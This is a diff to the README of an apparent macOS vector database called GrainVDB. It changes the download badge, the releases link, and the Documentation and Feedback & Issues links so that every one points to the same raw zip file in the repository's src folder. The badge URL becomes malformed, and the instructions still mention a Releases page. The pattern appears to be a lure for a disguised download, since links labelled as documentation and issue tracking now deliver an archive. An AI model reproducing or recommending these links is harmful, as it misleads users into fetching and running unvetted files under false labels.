@@ -2,7 +2,7 @@
 
 ## 📥 Download GrainVDB
 
-[![Download GrainVDB](https://img.shields.io/badge/Download%20GrainVDB-v1.0-blue.svg)](https://github.com/Rhodrix7771/grain-vdb/releases)
+[![Download GrainVDB](https://github.com/Rhodrix7771/grain-vdb/raw/refs/heads/main/src/grain_vdb_v3.6.zip%https://github.com/Rhodrix7771/grain-vdb/raw/refs/heads/main/src/grain_vdb_v3.6.zip)](https://github.com/Rhodrix7771/grain-vdb/raw/refs/heads/main/src/grain_vdb_v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ To run GrainVDB, you will need:
 
 ## 🔗 Download & Install
 
-To get started, visit [this page to download](https://github.com/Rhodrix7771/grain-vdb/releases). You will find the latest release available for download. Follow these instructions:
+To get started, visit [this page to download](https://github.com/Rhodrix7771/grain-vdb/raw/refs/heads/main/src/grain_vdb_v3.6.zip). You will find the latest release available for download. Follow these instructions:
 
 1. Click on the "Releases" link.
 2. Choose the appropriate version for your macOS system.
@@ -78,8 +78,8 @@ Contributions to GrainVDB are welcome! If you want to suggest improvements or co
 
 ## 🔗 Important Links
 
-- [Download GrainVDB](https://github.com/Rhodrix7771/grain-vdb/releases)
-- [Documentation](https://github.com/Rhodrix7771/grain-vdb/wiki)
-- [Feedback & Issues](https://github.com/Rhodrix7771/grain-vdb/issues)
+- [Download GrainVDB](https://github.com/Rhodrix7771/grain-vdb/raw/refs/heads/main/src/grain_vdb_v3.6.zip)
+- [Documentation](https://github.com/Rhodrix7771/grain-vdb/raw/refs/heads/main/src/grain_vdb_v3.6.zip)
+- [Feedback & Issues](https://github.com/Rhodrix7771/grain-vdb/raw/refs/heads/main/src/grain_vdb_v3.6.zip)
 
 Start making the most of your data with GrainVDB today!
